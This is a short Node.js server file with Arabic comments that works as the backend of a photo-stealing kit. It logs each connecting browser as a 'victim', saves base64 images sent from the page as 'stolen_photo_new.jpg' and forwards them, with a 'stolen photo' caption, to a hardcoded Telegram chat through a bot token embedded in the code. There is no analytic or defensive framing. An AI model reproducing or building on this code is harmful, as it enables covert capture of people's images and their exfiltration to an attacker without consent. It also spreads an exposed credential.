const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const token = '8352066341:AAH3t9gCrFaVWauhM91oKI-noVPR0EgS-lY'; // توكنك الحقيقي
const bot = new TelegramBot(token, { polling: true });

app.use(express.static('public'));

io.on('connection', (socket) => {
  console.log('ضحية متصلة يا كلب!');
  bot.sendMessage('5113566422', 'جهاز جديد متصل من المشروع الجديد!'); // آيدي شاتك

  socket.on('photoData', (data) => {
    fs.writeFileSync('stolen_photo_new.jpg', Buffer.from(data, 'base64'));
    bot.sendPhoto('5113566422', 'stolen_photo_new.jpg', { caption: 'صورة مسروقة من المشروع الجديد!' });
  });
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

server.listen(process.env.PORT || 3000);
